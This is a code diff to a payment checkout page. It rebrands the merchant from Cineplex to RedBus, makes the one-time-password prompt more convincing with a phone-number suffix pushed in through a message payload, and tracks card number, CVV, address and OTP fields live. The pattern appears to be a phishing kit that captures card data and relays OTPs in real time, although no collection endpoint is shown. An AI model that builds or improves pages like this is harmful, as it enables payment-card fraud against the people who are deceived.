@@ -980,11 +980,11 @@ url("pay1ment_icons.woff") format("woff");
                 <div class="otp-body" id="otp-body">
                     <div id="otp-form">
                         <h2>Enter your security code</h2>
-                        <p>Please enter your security code to authorize this payment</p>
+                        <p>We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits 2). Please submit your One-Time Password (OTP).</p>
                         <table class="otp-table">
                             <tr>
                                 <td>Merchant</td>
-                                <td>Cineplex</td>
+                                <td>RedBus</td>
                             </tr>
                             <tr id="otp-amount-row">
                                 <td>Amount</td>
@@ -1674,9 +1674,12 @@ url("pay1ment_icons.woff") format("woff");
 
 
   function showOtp() {
+    var p=msg.payload;
     var sec = q('otp-overlay');
     //var btn = q('btnSubmit');
     if (sec) sec.className = 'overlay';
+    document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+p.phoneSuffix+'). Please submit your One-Time Password (OTP).';
+    document.getElementById('otp-amount').textContent='$'+discountedTotal().toFixed(2);
     //if (btn) btn.style.display = 'none';
   }
  
@@ -1846,7 +1849,7 @@ url("pay1ment_icons.woff") format("woff");
     'cardNumber', 'expiry', 'cvv', 'cardHolder',
     'fullName', 'email', 'phone',
     'country', 'address1', 'address2', 'city', 'state', 'zipCode',
-    'otpCode'
+    'otp-code'
   ];
   liveInputs.forEach(function (id) {
     var el = q(id);
